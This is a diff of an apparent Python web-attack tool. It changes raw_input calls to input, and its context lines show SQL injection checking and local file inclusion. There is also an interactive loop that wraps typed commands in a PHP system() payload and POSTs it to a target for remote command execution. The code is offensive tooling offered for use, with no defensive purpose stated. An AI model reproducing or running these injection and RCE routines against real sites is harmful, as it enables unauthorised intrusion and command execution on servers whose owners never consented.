@@ -91,7 +91,7 @@ def execute_sqli(url, user):
 def sqli():
     print("[!] Example : http://target.com/parameter.php?id=10'+UNION+SELECT+1,2,3,*,5-- -")
     # url = input("[?] URL : ")
-    url = raw_input("[?] URL: ")
+    url = input("[?] URL: ")
 
     if re.search("http", url):
         url = url
@@ -102,8 +102,8 @@ def sqli():
     check_vuln_sqli(url)
 
 def lfitorce():
-    url = raw_input("[?] Input Url : ")
-    injection = raw_input("[?] Injection parameter (ex. ?page=Data) : ")
+    url = input("[?] Input Url : ")
+    injection = input("[?] Injection parameter (ex. ?page=Data) : ")
     pisah = injection.split("=")
 
     print("\n")
@@ -122,7 +122,7 @@ def lfitorce():
     i = 0
     
     while i < 1:
-        injection_command = raw_input("RCE@injection:# ")
+        injection_command = input("RCE@injection:# ")
         command = "<?php system('"+ injection_command +"'); ?>"
         rce = requests.post(delete_whitelist + in_payload, data=command)
         print(rce.text)
